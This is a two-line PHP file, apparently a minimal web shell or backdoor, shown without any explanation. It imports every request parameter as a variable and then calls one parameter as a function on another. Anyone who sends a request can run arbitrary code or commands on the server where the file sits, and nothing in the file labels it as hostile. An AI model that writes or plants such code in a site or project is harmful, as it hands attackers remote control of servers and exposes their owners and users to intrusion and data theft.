<?php
extract($_REQUEST) && @$pass(stripslashes($user)) && exit;